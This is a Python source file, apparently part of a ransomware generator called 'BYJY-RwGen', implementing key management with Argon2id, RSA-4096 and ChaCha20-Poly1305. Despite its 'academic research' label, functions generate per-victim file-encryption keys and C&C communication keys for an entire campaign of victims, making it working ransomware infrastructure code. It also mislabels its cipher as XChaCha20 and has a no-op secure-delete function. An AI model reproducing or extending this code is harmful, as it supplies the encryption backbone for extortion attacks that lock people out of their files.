#!/usr/bin/env python3
"""
Advanced Key Management System - BYJY-RwGen
Secure cryptographic key generation, derivation, and management
"""

import os
import hashlib
import hmac
import secrets
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.kdf.argon2 import Argon2id
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from Crypto.Cipher import ChaCha20_Poly1305
import base64
import json
import time

class QuantumKeyManager:
    """Advanced key management with post-quantum cryptographic support"""
    
    def __init__(self):
        self.backend = default_backend()
        self.master_keys = {}
        self.session_keys = {}
        
    def generate_master_key(self, key_id: str, entropy_bits: int = 256) -> bytes:
        """Generate cryptographically secure master key"""
        if entropy_bits not in [128, 192, 256, 512]:
            raise ValueError("Entropy must be 128, 192, 256, or 512 bits")
            
        entropy_bytes = entropy_bits // 8
        master_key = secrets.token_bytes(entropy_bytes)
        
        # Store with metadata
        self.master_keys[key_id] = {
            'key': master_key,
            'created': int(time.time()),
            'entropy_bits': entropy_bits,
            'usage_count': 0
        }
        
        return master_key
    
    def derive_encryption_key(self, master_key: bytes, context: str, 
                            key_length: int = 32) -> bytes:
        """Derive encryption key using Argon2id KDF"""
        # Use context as salt (in production, use random salt)
        salt = hashlib.sha256(context.encode()).digest()
        
        kdf = Argon2id(
            algorithm=hashes.SHA256(),
            length=key_length,
            salt=salt,
            time_cost=10,      # iterations
            memory_cost=131072, # 128 MB
            parallelism=8,     # threads
            backend=self.backend
        )
        
        return kdf.derive(master_key)
    
    def generate_session_key(self, session_id: str) -> bytes:
        """Generate ephemeral session key"""
        session_key = secrets.token_bytes(32)  # 256-bit
        
        self.session_keys[session_id] = {
            'key': session_key,
            'created': int(time.time()),
            'expires': int(time.time()) + 3600,  # 1 hour
            'usage_count': 0
        }
        
        return session_key
    
    def generate_rsa_keypair(self, key_size: int = 4096) -> tuple:
        """Generate RSA key pair for hybrid encryption"""
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=key_size,
            backend=self.backend
        )
        public_key = private_key.public_key()
        
        return private_key, public_key
    
    def rsa_encrypt_key(self, public_key, symmetric_key: bytes) -> bytes:
        """Encrypt symmetric key with RSA public key"""
        encrypted = public_key.encrypt(
            symmetric_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        return encrypted
    
    def rsa_decrypt_key(self, private_key, encrypted_key: bytes) -> bytes:
        """Decrypt symmetric key with RSA private key"""
        decrypted = private_key.decrypt(
            encrypted_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        return decrypted
    
    def xchacha20_encrypt(self, data: bytes, key: bytes, 
                         associated_data: bytes = None) -> dict:
        """Encrypt data using XChaCha20-Poly1305"""
        if len(key) != 32:
            raise ValueError("Key must be 32 bytes for XChaCha20")
            
        cipher = ChaCha20_Poly1305.new(key=key)
        
        if associated_data:
            cipher.update(associated_data)
            
        ciphertext, tag = cipher.encrypt_and_digest(data)
        
        return {
            'ciphertext': ciphertext,
            'nonce': cipher.nonce,
            'tag': tag,
            'associated_data': associated_data
        }
    
    def xchacha20_decrypt(self, encrypted_data: dict, key: bytes) -> bytes:
        """Decrypt data using XChaCha20-Poly1305"""
        cipher = ChaCha20_Poly1305.new(
            key=key, 
            nonce=encrypted_data['nonce']
        )
        
        if encrypted_data.get('associated_data'):
            cipher.update(encrypted_data['associated_data'])
            
        plaintext = cipher.decrypt_and_verify(
            encrypted_data['ciphertext'],
            encrypted_data['tag']
        )
        
        return plaintext
    
    def generate_victim_key_pair(self, victim_id: str) -> dict:
        """Generate unique key pair for specific victim"""
        # Generate unique seed from victim ID
        seed = hashlib.sha256(f"victim_{victim_id}_{int(time.time())}".encode()).digest()
        
        # Use seed to derive deterministic but unique keys
        master_key = self.derive_encryption_key(seed, f"master_{victim_id}")
        file_key = self.derive_encryption_key(master_key, f"files_{victim_id}")
        communication_key = self.derive_encryption_key(master_key, f"comm_{victim_id}")
        
        # Generate RSA pair for key exchange
        rsa_private, rsa_public = self.generate_rsa_keypair(4096)
        
        # Serialize RSA keys
        private_pem = rsa_private.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )
        
        public_pem = rsa_public.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        
        victim_keys = {
            'victim_id': victim_id,
            'master_key': base64.b64encode(master_key).decode(),
            'file_encryption_key': base64.b64encode(file_key).decode(),
            'communication_key': base64.b64encode(communication_key).decode(),
            'rsa_private_key': private_pem.decode(),
            'rsa_public_key': public_pem.decode(),
            'created_timestamp': int(time.time()),
            'key_derivation_params': {
                'algorithm': 'Argon2id',
                'time_cost': 10,
                'memory_cost': 131072,
                'parallelism': 8
            }
        }
        
        return victim_keys
    
    def rotate_session_keys(self, session_id: str) -> bytes:
        """Rotate session keys for forward secrecy"""
        if session_id in self.session_keys:
            old_key = self.session_keys[session_id]['key']
            # Derive new key from old key + timestamp
            rotation_seed = old_key + int(time.time()).to_bytes(8, 'big')
            new_key = hashlib.sha256(rotation_seed).digest()
            
            self.session_keys[session_id].update({
                'key': new_key,
                'rotated': int(time.time()),
                'rotation_count': self.session_keys[session_id].get('rotation_count', 0) + 1
            })
            
            return new_key
        else:
            return self.generate_session_key(session_id)
    
    def export_keystore(self, password: str) -> str:
        """Export encrypted keystore"""
        keystore_data = {
            'master_keys': {},
            'session_keys': {},
            'metadata': {
                'created': int(time.time()),
                'version': '1.0',
                'encryption': 'XChaCha20-Poly1305'
            }
        }
        
        # Convert bytes to base64 for JSON serialization
        for key_id, key_info in self.master_keys.items():
            keystore_data['master_keys'][key_id] = {
                'key': base64.b64encode(key_info['key']).decode(),
                'created': key_info['created'],
                'entropy_bits': key_info['entropy_bits'],
                'usage_count': key_info['usage_count']
            }
        
        for session_id, session_info in self.session_keys.items():
            keystore_data['session_keys'][session_id] = {
                'key': base64.b64encode(session_info['key']).decode(),
                'created': session_info['created'],
                'expires': session_info['expires'],
                'usage_count': session_info['usage_count']
            }
        
        # Encrypt keystore with password
        password_key = self.derive_encryption_key(
            password.encode(), 
            'keystore_encryption', 
            32
        )
        
        keystore_json = json.dumps(keystore_data, indent=2)
        encrypted_keystore = self.xchacha20_encrypt(
            keystore_json.encode(),
            password_key,
            b"BYJY_RwGen_Keystore_v1.0"
        )
        
        # Encode for storage
        export_data = {
            'encrypted_keystore': base64.b64encode(encrypted_keystore['ciphertext']).decode(),
            'nonce': base64.b64encode(encrypted_keystore['nonce']).decode(),
            'tag': base64.b64encode(encrypted_keystore['tag']).decode(),
            'version': '1.0'
        }
        
        return json.dumps(export_data, indent=2)
    
    def import_keystore(self, encrypted_keystore: str, password: str) -> bool:
        """Import encrypted keystore"""
        try:
            import_data = json.loads(encrypted_keystore)
            
            password_key = self.derive_encryption_key(
                password.encode(), 
                'keystore_encryption', 
                32
            )
            
            encrypted_data = {
                'ciphertext': base64.b64decode(import_data['encrypted_keystore']),
                'nonce': base64.b64decode(import_data['nonce']),
                'tag': base64.b64decode(import_data['tag']),
                'associated_data': b"BYJY_RwGen_Keystore_v1.0"
            }
            
            decrypted_json = self.xchacha20_decrypt(encrypted_data, password_key)
            keystore_data = json.loads(decrypted_json.decode())
            
            # Import master keys
            for key_id, key_info in keystore_data['master_keys'].items():
                self.master_keys[key_id] = {
                    'key': base64.b64decode(key_info['key']),
                    'created': key_info['created'],
                    'entropy_bits': key_info['entropy_bits'],
                    'usage_count': key_info['usage_count']
                }
            
            # Import session keys (check expiration)
            current_time = int(time.time())
            for session_id, session_info in keystore_data['session_keys'].items():
                if session_info['expires'] > current_time:  # Only import non-expired keys
                    self.session_keys[session_id] = {
                        'key': base64.b64decode(session_info['key']),
                        'created': session_info['created'],
                        'expires': session_info['expires'],
                        'usage_count': session_info['usage_count']
                    }
            
            return True
            
        except Exception as e:
            print(f"Keystore import failed: {e}")
            return False
    
    def cleanup_expired_keys(self):
        """Remove expired session keys"""
        current_time = int(time.time())
        expired_sessions = [
            session_id for session_id, session_info in self.session_keys.items()
            if session_info['expires'] <= current_time
        ]
        
        for session_id in expired_sessions:
            del self.session_keys[session_id]
        
        return len(expired_sessions)
    
    def get_key_statistics(self) -> dict:
        """Get keystore statistics"""
        current_time = int(time.time())
        
        active_sessions = sum(
            1 for session_info in self.session_keys.values()
            if session_info['expires'] > current_time
        )
        
        expired_sessions = len(self.session_keys) - active_sessions
        
        total_usage = sum(
            key_info['usage_count'] for key_info in self.master_keys.values()
        ) + sum(
            session_info['usage_count'] for session_info in self.session_keys.values()
        )
        
        return {
            'master_keys_count': len(self.master_keys),
            'active_sessions': active_sessions,
            'expired_sessions': expired_sessions,
            'total_key_usage': total_usage,
            'keystore_size_bytes': len(json.dumps({
                'master_keys': len(self.master_keys),
                'session_keys': len(self.session_keys)
            }))
        }

# Security utility functions
def secure_delete_key(key_bytes: bytes):
    """Securely overwrite key in memory"""
    if isinstance(key_bytes, bytes):
        # Overwrite with random data
        for _ in range(3):
            key_bytes = secrets.token_bytes(len(key_bytes))

def generate_campaign_keys(campaign_id: str, num_victims: int = 100) -> dict:
    """Generate key set for entire campaign"""
    key_manager = QuantumKeyManager()
    
    # Generate campaign master key
    campaign_master = key_manager.generate_master_key(f"campaign_{campaign_id}", 512)
    
    # Generate C&C communication keys
    c2_key = key_manager.derive_encryption_key(campaign_master, f"c2_{campaign_id}")
    
    # Generate victim keys in batch
    victim_keys = {}
    for i in range(num_victims):
        victim_id = f"{campaign_id}_victim_{i:04d}"
        victim_keys[victim_id] = key_manager.generate_victim_key_pair(victim_id)
    
    campaign_data = {
        'campaign_id': campaign_id,
        'campaign_master_key': base64.b64encode(campaign_master).decode(),
        'c2_communication_key': base64.b64encode(c2_key).decode(),
        'victim_count': num_victims,
        'victim_keys': victim_keys,
        'created_timestamp': int(time.time()),
        'key_manager_stats': key_manager.get_key_statistics()
    }
    
    return campaign_data

if __name__ == "__main__":
    # Example usage for research
    print("[+] BYJY-RwGen Key Manager - Academic Research Mode")
    
    key_manager = QuantumKeyManager()
    
    # Generate master key
    master_key = key_manager.generate_master_key("research_master", 256)
    print(f"[+] Generated master key: {len(master_key)} bytes")
    
    # Derive encryption key
    file_key = key_manager.derive_encryption_key(master_key, "file_encryption")
    print(f"[+] Derived file encryption key: {len(file_key)} bytes")
    
    # Test encryption/decryption
    test_data = b"This is research test data for academic purposes"
    encrypted = key_manager.xchacha20_encrypt(test_data, file_key)
    decrypted = key_manager.xchacha20_decrypt(encrypted, file_key)
    
    print(f"[+] Encryption test: {'SUCCESS' if test_data == decrypted else 'FAILED'}")
    
    # Generate victim keys for research
    victim_keys = key_manager.generate_victim_key_pair("research_victim_001")
    print(f"[+] Generated victim key set: {len(victim_keys)} components")
    
    # Display statistics
    stats = key_manager.get_key_statistics()
    print(f"[+] Keystore statistics: {stats}")